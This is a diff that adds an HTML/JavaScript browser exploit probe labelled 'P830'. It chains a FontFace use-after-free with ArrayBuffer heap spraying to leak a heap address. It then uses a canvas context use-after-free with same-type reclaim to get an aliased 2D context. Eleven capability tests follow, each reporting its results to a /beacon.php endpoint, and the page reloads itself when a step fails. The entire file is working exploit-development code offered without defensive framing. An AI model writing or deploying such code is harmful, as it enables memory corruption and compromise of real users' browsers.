@@ -1,0 +1,331 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>P830: Same-Type Alias Deep Capability Probe</title>
+<style>
+body{background:#0d1117;color:#c9d1d9;font:13px monospace;margin:8px;}
+pre{color:#7ee787;background:#161b22;border:1px solid #30363d;padding:8px;border-radius:4px;white-space:pre-wrap;word-break:break-all;}
+.ok{color:#3fb950;}.fail{color:#f85149;}.info{color:#58a6ff;}.hot{color:#ffa657;font-weight:bold;}
+</style>
+</head><body>
+<pre id="o">P830: same-type alias deep capability probe (11 tests)</pre>
+<script>
+'use strict';
+var O=document.getElementById('o');
+function log(s,c){var sp=document.createElement('span');sp.className=c||'';sp.textContent='\n'+s;O.appendChild(sp);}
+function bn(t,d){
+  try{var x=new XMLHttpRequest();
+  x.open('GET','/beacon.php?tag=P830-'+encodeURIComponent(t)+'&data='+encodeURIComponent(String(d||'').slice(0,900))+'&t='+Date.now(),false);
+  x.send();}catch(e){}
+}
+
+bn('BOOT','start');
+
+/* ===== Phase 0: FontFace UAF -> H ===== */
+var st=document.createElement('style');
+st.textContent="@font-face{font-family:bb1;src:local(Arial);unicode-range:U+0042;}";
+document.head.appendChild(st);
+var face=new FontFace('f1',"local('Helvetica')",{unicodeRange:'U+0041'});
+document.fonts.add(face);
+void face.loaded;
+
+var fabs=[],ffired=false;
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    if(ffired)return undefined;
+    ffired=true;
+    if(st){st.remove();st.textContent='';st=null;}
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    fabs=[];
+    for(var i=0;i<64;i++)fabs.push(new ArrayBuffer(192));
+    try{document.fonts.check('1em bb1');}catch(e){}
+    document.body.offsetHeight;
+    return undefined;
+  },set:function(){}
+});
+document.fonts.load('1em f1, bb1','AB');
+
+setTimeout(function(){
+  delete FontFace.prototype.then;
+
+  var bestI=-1,bestNz=0;
+  for(var i=0;i<fabs.length;i++){
+    var u=new Uint8Array(fabs[i]),nz=0;
+    for(var j=0;j<u.length;j++)if(u[j]!==0)nz++;
+    if(nz>bestNz){bestNz=nz;bestI=i;}
+  }
+  if(bestI<0||bestNz<4){
+    bn('FONT-MISS','nz='+bestNz);
+    setTimeout(function(){location.reload();},300);
+    return;
+  }
+  var fontDV=new DataView(fabs[bestI]);
+  var q11lo=fontDV.getUint32(0x58,true),q11hi=fontDV.getUint32(0x5C,true);
+  if(q11hi===0){bn('FONT-BAD','');setTimeout(function(){location.reload();},300);return;}
+  var borrow=(q11lo<0x68)?1:0;
+  var H_hi=q11hi-borrow, H_lo=(q11lo-0x68)>>>0;
+  var Hstr='0x'+H_hi.toString(16)+('00000000'+H_lo.toString(16)).slice(-8);
+  bn('HEAP-OK','H='+Hstr);
+  log('H = '+Hstr,'ok');
+
+  /* ===== Phase 1: Canvas UAF + same-type reclaim ===== */
+  var innerCtx=null;
+  var canvas=document.createElement('canvas');
+  canvas.width=1;canvas.height=1;
+  var opts={};
+  Object.defineProperty(opts,'alpha',{
+    get:function(){innerCtx=canvas.getContext('2d');return true;}
+  });
+  canvas.getContext('bitmaprenderer',opts);
+  if(!innerCtx){bn('UAF-FAIL','');setTimeout(function(){location.reload();},300);return;}
+
+  /* Same-type spray */
+  var sprays=[];
+  for(var i=0;i<200;i++){
+    var c2=document.createElement('canvas');c2.width=1;c2.height=1;
+    sprays.push({c:c2,ctx:c2.getContext('2d')});
+  }
+
+  /* Find alias */
+  var aliasIdx=-1;
+  for(var i=0;i<sprays.length;i++){
+    sprays[i].ctx.lineWidth=1000+i;
+    var v;try{v=innerCtx.lineWidth;}catch(e){v=-1;}
+    if(v===1000+i){aliasIdx=i;break;}
+    sprays[i].ctx.lineWidth=1;
+  }
+  if(aliasIdx<0){bn('NO-ALIAS','');setTimeout(function(){location.reload();},300);return;}
+
+  var sprayCtx=sprays[aliasIdx].ctx;
+  sprayCtx.lineWidth=1;
+  bn('ALIAS-OK','idx='+aliasIdx);
+  log('Alias at spray['+aliasIdx+']','ok');
+
+  /* ============================== */
+  /* TEST A: structuredClone transfer */
+  /* ============================== */
+  var scOk=false, scLen=-1;
+  try{
+    var testAB=new ArrayBuffer(256);
+    new Uint8Array(testAB).fill(0xAA);
+    var result=structuredClone(testAB,{transfer:[testAB]});
+    scLen=testAB.byteLength;
+    scOk=(scLen===0);
+    bn('SC-XFER','detached='+(scLen===0)+'|resultLen='+(result?result.byteLength:-1));
+    log('A: structuredClone transfer: detached='+(scLen===0)+', result='+(result?result.byteLength:'null'),'ok');
+  }catch(e){
+    bn('SC-XFER','err='+e.message);
+    log('A: structuredClone transfer: '+e.message,'fail');
+  }
+
+  /* ============================== */
+  /* TEST B: CanvasGradient through alias */
+  /* ============================== */
+  var grad=sprayCtx.createLinearGradient(0,0,100,100);
+  grad.addColorStop(0,'#FF0000');
+  grad.addColorStop(1,'#0000FF');
+  sprayCtx.fillStyle=grad;
+
+  var aliasFS;
+  try{aliasFS=innerCtx.fillStyle;}catch(e){aliasFS='ERR:'+e.message;}
+  var gradType=typeof aliasFS;
+  var gradSame=(aliasFS===grad);
+  var gradCtor=(aliasFS&&aliasFS.constructor)?aliasFS.constructor.name:'none';
+  var gradStr='';
+  try{gradStr=String(aliasFS).slice(0,60);}catch(e){gradStr='err';}
+
+  bn('GRAD','type='+gradType+'|same='+gradSame+'|ctor='+gradCtor+'|str='+gradStr);
+  log('B: Gradient via alias: typeof='+gradType+', same='+gradSame+', ctor='+gradCtor,'info');
+  log('   String(val)='+gradStr,'info');
+
+  sprayCtx.fillStyle='#000000';
+
+  /* ============================== */
+  /* TEST C: CanvasPattern through alias */
+  /* ============================== */
+  var patCanvas=document.createElement('canvas');
+  patCanvas.width=2;patCanvas.height=2;
+  var patCtx=patCanvas.getContext('2d');
+  patCtx.fillStyle='#FF00FF';
+  patCtx.fillRect(0,0,2,2);
+  var pat=sprayCtx.createPattern(patCanvas,'repeat');
+  sprayCtx.fillStyle=pat;
+
+  var aliasPat;
+  try{aliasPat=innerCtx.fillStyle;}catch(e){aliasPat='ERR:'+e.message;}
+  var patType=typeof aliasPat;
+  var patSame=(aliasPat===pat);
+  var patCtor=(aliasPat&&aliasPat.constructor)?aliasPat.constructor.name:'none';
+
+  bn('PAT','type='+patType+'|same='+patSame+'|ctor='+patCtor);
+  log('C: Pattern via alias: typeof='+patType+', same='+patSame+', ctor='+patCtor,'info');
+
+  sprayCtx.fillStyle='#000000';
+
+  /* ============================== */
+  /* TEST D: font string through alias */
+  /* ============================== */
+  sprayCtx.font='italic bold 48px serif';
+  var aliasFont;
+  try{aliasFont=innerCtx.font;}catch(e){aliasFont='ERR:'+e.message;}
+  bn('FONT-STR','val='+String(aliasFont).slice(0,80));
+  log('D: Font via alias: "'+aliasFont+'"','info');
+
+  /* ============================== */
+  /* TEST E: filter string through alias */
+  /* ============================== */
+  var filterOk=false,aliasFilter='';
+  try{
+    sprayCtx.filter='blur(5px)';
+    aliasFilter=innerCtx.filter;
+    filterOk=true;
+  }catch(e){aliasFilter='ERR:'+e.message;}
+  bn('FILTER','ok='+filterOk+'|val='+String(aliasFilter).slice(0,80));
+  log('E: Filter via alias: "'+aliasFilter+'" (ok='+filterOk+')','info');
+  try{sprayCtx.filter='none';}catch(e){}
+
+  /* ============================== */
+  /* TEST F: save() depth measurement */
+  /* ============================== */
+  sprayCtx.lineWidth=1;
+  var maxSaves=0;
+  try{
+    for(var s=0;s<2000;s++){
+      sprayCtx.save();
+      sprayCtx.lineWidth=2000+s;
+      maxSaves=s+1;
+    }
+  }catch(e){
+    bn('SAVE-ERR','at='+maxSaves+'|e='+e.message);
+  }
+  var deepLW;
+  try{deepLW=innerCtx.lineWidth;}catch(e){deepLW='ERR';}
+  bn('SAVE-DEPTH','max='+maxSaves+'|lw='+deepLW);
+  log('F: Save depth: '+maxSaves+' levels, deepLW='+deepLW,'ok');
+
+  for(var r=0;r<maxSaves;r++){
+    try{sprayCtx.restore();}catch(e){break;}
+  }
+  var restoredLW;
+  try{restoredLW=innerCtx.lineWidth;}catch(e){restoredLW='ERR';}
+  bn('RESTORE-ALL','lw='+restoredLW);
+  log('F: After restore all: lineWidth='+restoredLW,'ok');
+
+  /* ============================== */
+  /* TEST G: fillStyle DAZ-free byte extraction */
+  /* ============================== */
+  var colorTests=[
+    '#010203','#FE7F00','#FF00FF','#000001','#800080',
+    'rgba(1,2,3,0.5)','rgba(255,128,64,0.0039)','rgba(0,0,0,1)'
+  ];
+  var colorResults=[];
+  for(var ct=0;ct<colorTests.length;ct++){
+    sprayCtx.fillStyle=colorTests[ct];
+    var readBack;
+    try{readBack=innerCtx.fillStyle;}catch(e){readBack='ERR';}
+    colorResults.push(colorTests[ct]+'->'+readBack);
+  }
+  bn('COLOR-BYTES',colorResults.join('|'));
+  log('G: Color byte roundtrip:','info');
+  for(var cr=0;cr<colorResults.length;cr++)log('   '+colorResults[cr],'ok');
+
+  /* ============================== */
+  /* TEST H: BigUint64Array detection */
+  /* ============================== */
+  var bu64=false;
+  try{var t=new BigUint64Array(1);bu64=true;}catch(e){}
+  bn('BU64','avail='+bu64);
+  log('H: BigUint64Array: '+(bu64?'YES':'NO'),'ok');
+
+  sprayCtx.setLineDash([1.5,2.5,3.5,4.5]);
+  var dashBack;
+  try{dashBack=innerCtx.getLineDash();}catch(e){dashBack=[];}
+  var dashMatch=(dashBack.length===4 && dashBack[0]===1.5 && dashBack[3]===4.5);
+  bn('DASH-ALIAS','len='+dashBack.length+'|match='+dashMatch);
+  log('H: LineDash alias: len='+dashBack.length+', match='+dashMatch,'ok');
+
+  /* ============================== */
+  /* TEST I: AB transfer -> lineDash zone crossover */
+  /* ============================== */
+  if(scOk){
+    var ZONE_SIZE=384;
+    var zoneABs=[];
+    for(var z=0;z<100;z++){
+      var zab=new ArrayBuffer(ZONE_SIZE);
+      var zdv=new DataView(zab);
+      for(var d=0;d<48;d++)zdv.setFloat64(d*8, 7.77+d*0.01, true);
+      zoneABs.push(zab);
+    }
+    var detachOk=0;
+    for(var z=0;z<100;z++){
+      try{
+        structuredClone(zoneABs[z],{transfer:[zoneABs[z]]});
+        if(zoneABs[z].byteLength===0)detachOk++;
+      }catch(e){}
+    }
+    bn('ZONE-DETACH','ok='+detachOk+'/100');
+    log('I: Detached '+detachOk+'/100 AB(384)s','info');
+
+    var zeroPattern=[];
+    for(var d=0;d<48;d++)zeroPattern.push(0);
+    sprayCtx.setLineDash(zeroPattern);
+
+    var zoneDash;
+    try{zoneDash=innerCtx.getLineDash();}catch(e){zoneDash=[];}
+    var allZero=true;
+    for(var d=0;d<zoneDash.length;d++){if(zoneDash[d]!==0){allZero=false;break;}}
+    bn('ZONE-DASH','len='+zoneDash.length+'|allZero='+allZero);
+
+    sprayCtx.setLineDash([99.99,88.88,77.77,66.66]);
+
+    var probe_abs=[];
+    for(var p=0;p<50;p++)probe_abs.push(new ArrayBuffer(ZONE_SIZE));
+
+    var residualHits=0;
+    for(var p=0;p<50;p++){
+      var pu=new Uint8Array(probe_abs[p]);
+      var nz=0;
+      for(var b=0;b<pu.length;b++)if(pu[b]!==0)nz++;
+      if(nz>0)residualHits++;
+    }
+    bn('ZONE-RESIDUAL','hits='+residualHits);
+    log('I: Zone residual: '+residualHits+'/50 ABs with nonzero','info');
+  }else{
+    bn('ZONE-SKIP','no structuredClone transfer');
+    log('I: Zone test SKIPPED','fail');
+  }
+
+  /* ============================== */
+  /* TEST J: error stack code address leak */
+  /* ============================== */
+  var stackStr='';
+  try{null.x;}catch(e){stackStr=e.stack||'';}
+  bn('STACK','len='+stackStr.length+'|val='+stackStr.slice(0,200));
+  log('J: Error stack: '+(stackStr.length>0?stackStr.slice(0,200):'EMPTY'),'info');
+
+  /* ============================== */
+  /* TEST K: gradient toString introspection */
+  /* ============================== */
+  var gradInfo='';
+  try{
+    var g2=sprayCtx.createLinearGradient(0,0,1,1);
+    gradInfo='toString='+g2.toString()+'|proto='+Object.getPrototypeOf(g2).constructor.name;
+    var props=Object.getOwnPropertyNames(g2);
+    gradInfo+='|ownProps='+props.join(',');
+    gradInfo+='|keys='+Object.keys(g2).join(',');
+  }catch(e){gradInfo='ERR:'+e.message;}
+  bn('GRAD-DETAIL',gradInfo.slice(0,400));
+  log('K: Gradient detail: '+gradInfo.slice(0,200),'info');
+
+  /* ============================== */
+  /* DONE */
+  /* ============================== */
+  var summary='tests=A-K|alias='+aliasIdx+'|H='+Hstr+'|sc='+scOk+'|bu64='+bu64;
+  bn('DONE',summary);
+  log('','');
+  log('P830 COMPLETE - all 11 tests beaconed','hot');
+
+},600);
+</script></body></html>
